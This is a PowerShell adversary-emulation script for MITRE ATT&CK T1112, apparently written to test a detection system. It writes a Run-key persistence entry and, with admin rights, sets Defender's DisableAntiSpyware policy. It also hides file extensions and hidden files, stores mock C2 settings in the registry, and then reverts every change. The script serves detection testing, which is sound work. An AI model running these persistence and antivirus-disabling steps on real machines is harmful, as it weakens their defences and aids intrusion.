# ============================================
# T1112 - Modify Registry
# ============================================
# This script demonstrates registry modification for persistence
# Safe demo - creates test keys in non-critical locations
# ============================================

Write-Host "`n[ATTACK] T1112 - Modify Registry" -ForegroundColor Red
Write-Host "============================================`n" -ForegroundColor Red

# Check if running as Administrator
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "[WARNING] Some registry operations require Administrator privileges" -ForegroundColor Yellow
}

Write-Host "[PHASE 1] Creating Persistence via Run Keys" -ForegroundColor Cyan
Write-Host "[INFO] Modifying HKCU\Software\Microsoft\Windows\CurrentVersion\Run" -ForegroundColor Gray

# Safe demo payload - just opens notepad
$payloadPath = "C:\Windows\System32\notepad.exe"
$payloadArgs = "$env:TEMP\demo_persistence.txt"

# Create marker file
"MultiKG Demo - Persistence Test" | Out-File "$env:TEMP\demo_persistence.txt"

# Add Run key
$runKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
try {
    Set-ItemProperty -Path $runKeyPath -Name "MultiKGDemo" -Value "$payloadPath $payloadArgs" -Type String
    Write-Host "[SUCCESS] Persistence key added: MultiKGDemo" -ForegroundColor Green
    
    # Verify
    $value = Get-ItemProperty -Path $runKeyPath -Name "MultiKGDemo" -ErrorAction SilentlyContinue
    Write-Host "[VALUE] $($value.MultiKGDemo)" -ForegroundColor Gray
} catch {
    Write-Host "[ERROR] Failed to add Run key: $_" -ForegroundColor Red
}

Start-Sleep -Seconds 2

Write-Host "`n[PHASE 2] Disabling Security Features (Simulated)" -ForegroundColor Cyan
Write-Host "[INFO] Attempting to disable Windows Defender..." -ForegroundColor Gray

# Note: This requires Admin and may be blocked by Tamper Protection
if ($isAdmin) {
    $defenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
    
    # Create key if not exists
    if (-not (Test-Path $defenderPath)) {
        New-Item -Path $defenderPath -Force | Out-Null
    }
    
    try {
        # DisableAntiSpyware (NOTE: Tamper Protection may block this)
        Set-ItemProperty -Path $defenderPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -ErrorAction Stop
        Write-Host "[SUCCESS] DisableAntiSpyware set to 1" -ForegroundColor Green
    } catch {
        Write-Host "[BLOCKED] Tamper Protection prevented registry modification" -ForegroundColor Yellow
        Write-Host "[INFO] This is expected behavior - demonstrates detection opportunity" -ForegroundColor Cyan
    }
} else {
    Write-Host "[SKIPPED] Requires Administrator privileges" -ForegroundColor Yellow
}

Start-Sleep -Seconds 2

Write-Host "`n[PHASE 3] Modifying System Configuration" -ForegroundColor Cyan
Write-Host "[INFO] Changing Explorer settings..." -ForegroundColor Gray

$explorerPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
try {
    # Hide file extensions (attacker tactic)
    Set-ItemProperty -Path $explorerPath -Name "HideFileExt" -Value 1 -Type DWord
    Write-Host "[SUCCESS] HideFileExt = 1" -ForegroundColor Green
    
    # Hide hidden files
    Set-ItemProperty -Path $explorerPath -Name "Hidden" -Value 2 -Type DWord
    Write-Host "[SUCCESS] Hidden = 2" -ForegroundColor Green
} catch {
    Write-Host "[ERROR] Failed to modify Explorer settings: $_" -ForegroundColor Red
}

Start-Sleep -Seconds 2

Write-Host "`n[PHASE 4] Creating Custom Registry Keys" -ForegroundColor Cyan
Write-Host "[INFO] Adding malicious configuration..." -ForegroundColor Gray

$customKeyPath = "HKCU:\Software\MultiKGTest"
try {
    # Create custom key
    if (-not (Test-Path $customKeyPath)) {
        New-Item -Path $customKeyPath -Force | Out-Null
    }
    
    # Add multiple values
    Set-ItemProperty -Path $customKeyPath -Name "C2Server" -Value "192.168.1.100:4444" -Type String
    Set-ItemProperty -Path $customKeyPath -Name "BeaconInterval" -Value 60 -Type DWord
    Set-ItemProperty -Path $customKeyPath -Name "Encrypted" -Value 1 -Type DWord
    
    Write-Host "[SUCCESS] Custom registry key created with C2 configuration" -ForegroundColor Green
} catch {
    Write-Host "[ERROR] Failed to create custom key: $_" -ForegroundColor Red
}

Write-Host "`n[PHASE 5] Using reg.exe for Registry Operations" -ForegroundColor Cyan
Write-Host "[INFO] Command-line registry modification..." -ForegroundColor Gray

# Use reg.exe (generates different event patterns)
$regCommand = "reg add HKCU\Software\MultiKGTest /v LastCheckin /t REG_SZ /d $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') /f"
Write-Host "[COMMAND] $regCommand" -ForegroundColor Yellow

Invoke-Expression $regCommand | Out-Null

Write-Host "`n[ATTACK COMPLETE]" -ForegroundColor Red
Write-Host "[REGISTRY MODIFICATIONS]" -ForegroundColor Gray
Write-Host "  - HKCU\...\Run\MultiKGDemo (Persistence)" -ForegroundColor Gray
Write-Host "  - HKCU\...\Explorer\Advanced (Configuration)" -ForegroundColor Gray
Write-Host "  - HKCU\Software\MultiKGTest (Custom keys)" -ForegroundColor Gray

Write-Host "`n[DETECTION SYSTEM] Should detect registry modification patterns..." -ForegroundColor Cyan

# Cleanup prompt
Write-Host "`nPress any key to revert registry changes..." -ForegroundColor Yellow
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

Write-Host "`n[CLEANUP] Removing registry modifications..." -ForegroundColor Cyan

# Remove Run key
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MultiKGDemo" -ErrorAction SilentlyContinue

# Revert Explorer settings
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideFileExt" -Value 0
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "Hidden" -Value 1

# Remove custom key
Remove-Item -Path "HKCU:\Software\MultiKGTest" -Recurse -Force -ErrorAction SilentlyContinue

# Remove Defender key if created
if ($isAdmin) {
    Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -ErrorAction SilentlyContinue
}

# Remove marker file
Remove-Item "$env:TEMP\demo_persistence.txt" -Force -ErrorAction SilentlyContinue

Write-Host "[SUCCESS] Registry restored to original state" -ForegroundColor Green
